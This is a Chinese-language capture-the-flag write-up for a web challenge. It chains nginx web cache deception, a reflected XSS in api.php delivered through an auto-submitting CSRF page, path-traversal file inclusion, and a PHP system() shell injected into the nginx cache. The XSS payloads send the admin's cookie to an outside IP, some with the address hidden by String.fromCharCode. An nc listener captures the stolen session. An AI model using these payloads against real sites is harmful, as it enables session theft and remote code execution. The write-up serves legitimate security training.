# The Matrix

> 小西



## 描述

Luckiy, we tracked the website of the Matrix. Now you have to hack their website and figure out who they are and whom they are working for. Here is their website:

- http://ctf.momomoxiaoxi.com:80/
- http://ctf.momomoxiaoxi.com:8080/

## 运行

```
docker-compose build
docker-compose up -d
注意:
需要配置ctf.momomoxiaoxi.com指向对应服务器，现在在为202.112.51.135
```

## 思路

收集信息

1. 我们可以发送一个链接给管理员，管理员会点击我们的url
2. 网站同时开启了80和8080端口

2条件非常奇怪，仔细研究，扫描一下，

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.10.1 (Ubuntu)
|_http-server-header: nginx/1.10.1 (Ubuntu)
|_http-title: The Matrix
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Matrix
```

怀疑使用了nginx反向代理了服务器，80反向代理了8080.

nginx可能开启缓存，进行 [Web Cache Deception attack](http://www.360zhijia.com/360anquanke/281351.html) 

发送一个留言请求：

http://ctf.momomoxiaoxi.com/admin.php/moxiaoxi.css

代理会讲这个页面缓存下来，我们再访问这个页面，就能看到页面内容

但是，此时没办法获得admin密码

```html
	              </thead>
	              <tbody><tr><td>admin</td><td><div onclick=get_password('admin') id='admin' style='cursor:pointer'>***********</div></td><td>admin@timehackers</td></tbody><tbody><tr><td>jonny</td><td><div onclick=get_password('jonny') id='jonny' style='cursor:pointer'>***********</div></td><td>jonny@timehackers</td></tbody><tbody><tr><td>pro_hacker</td><td><div onclick=get_password('pro_hacker') id='pro_hacker' style='cursor:pointer'>***********</div></td><td>pro_hacker@timehackers</td></tbody>            </table>
	          </div>
```

需要点击一下。

研究get_password函数.

```html
  <script src="/static/$uper$ecret@dmin.js"></script>  <script>
    var csrf_token = "7aacf6d79272b6349a8bd687a5e4f4f3";
```

发现get_password来源一个奇怪的js

```js
function get_password(username) {
	$.ajax({
		type: "POST",
		url: "/api.php",
		data: {"token":csrf_token,"action":"get_password","username":username},
		dataType: "json",
		success:function (data) {
			if (data["error"] === '')
			{
				$("#" + username).text(data["result"]);
			}
			else
				alert('Error: ' + data["error"]);
        }
	});
}

```

进一步分析，发现api.php存在反射性xss漏洞

```http
POST /api.php HTTP/1.1
Host: ctf.momomoxiaoxi.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Cookie: PHPSESSID=86gb25qq39f301g3j59afadbi0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

token=d096148ee0d3cf1<img src=x onerror='alert(1)'>d4478b1b79785f81a&action=get_password&username=admin
```

XSS的主要原因是对方将json数据以`test/html`格式返回了。（这个在现实中很多服务都有这样的误配置）

json会将`/`转义。

当下，我们有一个XSS，但是没办法CSRF（因为没办法窃取token），同时我们还能控制admin访问一个页面。

那么，我们现在就没办法控制admin完成点击显示密码的功能。那下一步该如何做呢？

继续思考。。。

我们可以利用CSRF+XSS组合拳获得admin的cookie，获得cookie后就能成为admin了。

让admin先访问一个我们的页面，我们的页面自动向api.php提交一个包，触发xss，窃取cookie。

首先，测试获得一个可用的xss。

- Payload1:

  利用onerror执行任意js

  ```html
  token=d096148ee0d3cf1'<img src=x onerror = document.body.appendChild(document.createElement('img')).setAttribute('src','http://202.112.51.135:8001/?='%2Bdocument.cookie); >'d4478b1b79785f81a&action=get_password&username=admin
  ```
  反斜杠被转义，我们利用String.fromCharCode绕过
  ```html
  token=d096148ee0d3cf1'<img src=x onerror = document.body.appendChild(document.createElement('img')).setAttribute('src',String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 53, 58, 56, 48, 48, 49, 47, 63, 61)%2Bdocument.cookie); >'d4478b1b79785f81a&action=get_password&username=admin
  ```

  ```html
  <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body onload="document.forms[0].submit()">
    <script>history.pushState('', '', '/')</script>
      <form action="http://ctf.momomoxiaoxi.com/api.php" method="POST">
        <input type="hidden" name="token" value="d096148ee0d3cf1&apos;&lt;img&#32;src&#61;x&#32;onerror&#32;&#61;&#32;document&#46;body&#46;appendChild&#40;document&#46;createElement&#40;&apos;img&apos;&#41;&#41;&#46;setAttribute&#40;&apos;src&apos;&#44;&apos;http&#58;&#47;&#47;202&#46;112&#46;51&#46;135&#58;8001&#47;&#63;&#61;&apos;&#43;document&#46;cookie&#41;&#59;&#32;&gt;&apos;d4478b1b79785f81a" />
        <input type="hidden" name="action" value="get&#95;password" />
        <input type="hidden" name="username" value="admin" />
        <input type="submit" value="Submit request" />
      </form>
    </body>
  </html>
  ```

- Payload2:

  利用svg的src属性

  ```html
  <svg onload='img = new Image(); img.src="http://202.112.51.135:9090/?z="+document.cookie;'>
  
  token=d096148ee0d3cf1<svg onload='img = new Image(); img.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 53, 58, 57, 48, 57, 48, 47, 63, 122, 61)+document.cookie;'>&action=get_password&username=admin
  
  token=d096148ee0d3cf1'<svg onload='img = new Image(); img.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 53, 58, 57, 48, 57, 48, 47, 63, 122, 61).concat(btoa(document.cookie));'>'&action=get_password&username=admin
      
      concat(btoa(document.cookie)); 
  
  ```

  ```html
  <form name="x" action="http://ctf.momomoxiaoxi.com/api.php" method="post">
      <input type="hidden" name="token" value="e70587b636fbd1193<svg onload='img = new Image(); img.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 53, 58, 57, 48, 57, 48, 47, 63, 122, 61)+document.cookie;'>">
      <input type="hidden" name="action" value="get_password">
      <input type="hidden" name="username" value="admin">
  
  </form>
  <script>document.x.submit()</script>
  ```

窃取到cookie

```bash
ubuntu@ubuntu:~$ nc -l 9090
GET /?z=PHPSESSID=krpmh7ui84dgqvqd54ekffefn7 HTTP/1.1
Referer: http://ctf.momomoxiaoxi.com/api.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 202.112.51.135:9090
```

登陆后，获得密码

| Username   | Password            | Email                  |
| ---------- | ------------------- | ---------------------- |
| admin      | 0mgH@rdP@sS         | admin@timehackers      |
| jonny      | j0HhNy1337          | jonny@timehackers      |
| pro_hacker | M@kE_L0Ve_St0P_H@cK | pro_hacker@timehackers |

然后，在logout处发现文件包含漏洞

```url
http://ctf.momomoxiaoxi.com/admin.php?p=logout.php
http://ctf.momomoxiaoxi.com/admin.php?p=../../../../../../../../etc/passwd
http://ctf.momomoxiaoxi.com/admin.php?p=../../../../../../../../etc/nginx/nginx.conf
```

联想到前面的nginx缓存，我们可以利用缓存机制写一个shell到缓存中，并使用文件包含，包含缓存。（这个思路有点像把一个shell写入日志，再包含的概念）

查看nginx的缓存配置：

http://ctf.momomoxiaoxi.com/admin.php?p=../../../../../../../../etc/nginx/nginx.conf

```
http {
  ##
  # Cache
  ##

  proxy_cache_path /var/lib/nginx/cache levels=1:2 keys_zone=backcache:8m max_size=50m;
  #proxy_cache_key "$scheme$request_method$host$request_uri$is_args$args";
  proxy_cache_key "$host$request_uri";
  proxy_cache_valid 200 302 10m;
  proxy_cache_valid 404 1m;
  proxy_cache_methods GET;
```

缓存目录在`/var/lib/nginx/cache`,levels为1:2

请求url

```http
GET /index.php/a.css?<?=system($_GET['moxiaoxi']);?>  HTTP/1.1
Host: ctf.momomoxiaoxi.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://ctf.momomoxiaoxi.com/admin.php?p=../../../../../../../etc/passwd
Cookie: PHPSESSID=anohd4cgeo6r60f4boar8td663
DNT: 1
Connection: close


```

此时，`$host=ctf.momomoxiaoxi.com,$request_uri=/index.php/a.css?<?=system($_GET['moxiaoxi']);?>` 哈希为`md5(ctf.momomoxiaoxi.com/index.php/a.css?<?=system($_GET['moxiaoxi']);?> `

为`196a87789a6cdc48228e48c484fdce90`

按照配置⽂件中所规定的 1:2 的命名法，可以得到完整路径 为： `/var/lib/nginx/cache/0/e9/196a87789a6cdc48228e48c484fdce90`

```http
GET /admin.php?p=../../../../../../../../../var/lib/nginx/cache/0/e9/196a87789a6cdc48228e48c484fdce90&moxiaoxi=cat+/flag/* HTTP/1.1
Host: ctf.momomoxiaoxi.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://ctf.momomoxiaoxi.com/admin.php
Cookie: PHPSESSID=86gb25qq39f301g3j59afadbi0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1


```

可以得到flag

```http
       ��g[    ����������g[    4�  � �                                                                                                      
KEY: ctf.momomoxiaoxi.com/index.php/a.css?flag{Xss_CsRF_Ng1nx_CACH@}
flag{Xss_CsRF_Ng1nx_CACH@}HTTP/1.1 200 OK
Date: Mon, 06 Aug 2018 05:50:18 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 1167
Connection: close
Content-Type: text/html; charset=UTF-8

```

flag{Xss_CsRF_Ng1nx_CACH@}

## 参考

1. https://blog.veryhax.ninja/blog/ctfzone17-timehackers/
2. TIMEHACKERS